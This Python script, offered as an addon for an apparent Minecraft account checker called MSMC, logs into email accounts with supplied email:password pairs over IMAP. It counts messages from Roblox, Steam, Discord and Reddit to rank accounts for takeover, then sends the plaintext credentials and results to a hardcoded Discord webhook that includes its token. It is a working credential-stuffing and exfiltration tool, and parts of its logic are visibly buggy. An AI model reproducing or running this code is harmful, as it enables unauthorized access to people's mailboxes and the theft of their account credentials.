import imaplib, requests, json
from email.utils import parsedate_to_datetime

# Addon for MSMC
# This very simple addon allows you to change MSMC into an inboxing tool along with the normal minecraft checker.
# This takes valid mails from MSMC and checks for the amount of emails sent from websites like roblox, steam, discord, and more!
# This requires no proxies!

# Config: An actual config file might be added soon.
check_roblox = True
check_steam = True
check_discord = True
check_reddit = True
# More will be added soon! Create an issue on github suggesting what to add. I might also add captures to these websites!
discord_webhook = "https://canary.discord.com/api/webhooks/1245656011310764144/XlQcFMy7nSwIVaf7MMBdbkN2BYYcFEMI1T2AmZYEhEO-No36UGW3en7f1wds5qt5YIEN"

def inboxmail(email, password):
    # Setup IMAP
    email_parts = email.split('@')
    domain = email_parts[-1]
    
    outlook_domains = ["hotmail.com", "outlook.com", "hotmail.fr", "outlook.fr", "live.com", "live.fr"]
    
    if domain in outlook_domains:
        imap_servers = ['outlook.office365.com']
    else:
        imap_servers = [f'imap.{domain}']
    for imap_server in imap_servers:
        try:
            imap = imaplib.IMAP4_SSL(imap_server, timeout=30)

        except Exception as e:
            continue
        try:
            imap.login(email, password)
            status, messages = imap.select("inbox")
            if status == "OK":
                # Check for Emails
                counts = {}
                if check_roblox == True:
                    result, data = imap.uid("search", None, f'(FROM "noreply@roblox.com")')
                    if result == "OK":
                        counts['Roblox'] = len(data[0].split())
                if check_steam == True:
                    result, data = imap.uid("search", None, f'(FROM "noreply@steampowered.com")')
                    if result == "OK":
                        counts['Steam'] = len(data[0].split())
                if check_discord == True:
                    result, data = imap.uid("search", None, f'(FROM "noreply@discord.com")')
                    if result == "OK":
                        discord_uids = data[0].split()
                        counts['Discord'] = len(discord_uids)
                        if len(discord_uids) > 1:
                            result, data = imap.uid("fetch", discord_uids[0], "(BODY[HEADER.FIELDS (DATE)])")
                            if result == "OK":
                                date_str = data[0][1].decode().strip()
                                email_date = parsedate_to_datetime(date_str)
                                discord_year = email_date.year
                if check_reddit == True:
                    result, data = imap.uid("search", None, f'(FROM "noreply@reddit.com")')
                    if result == "OK":
                        reddit_uids = data[0].split()
                        counts['Reddit'] = len(reddit_uids)
                        if len(reddit_uids) > 1:
                            result, data = imap.uid("fetch", reddit_uids[0], "(BODY[HEADER.FIELDS (DATE)])")
                            if result == "OK":
                                date_str = data[0][1].decode().strip()
                                email_date = parsedate_to_datetime(date_str)
                                reddit_year = email_date.year

        except Exception as e:
            continue
        # Discord Webhook
        if any(count > 0 for count in counts.values()):
                    message = f"**Valid Mail!**\n{email}:{password}\n\n**Capture:**\n"
                    for service, count in counts.items():
                        if service == 'Reddit' and count > 1 and reddit_year:
                            message += f"{service}: {count} ✅ (Estimated Year: {reddit_year})\n"
                        elif service == 'Discord' and count > 1 and reddit_year:
                            message += f"{service}: {count} ✅ (Estimated Year: {discord_year})\n"
                        elif count > 0:
                            message += f"{service}: {count} ✅\n"
                        else:
                            message += f"{service}: {count}\n"
                    
                    payload = {"content": message}
        requests.post(discord_webhook, data=json.dumps(payload), headers={"Content-Type": "application/json"})
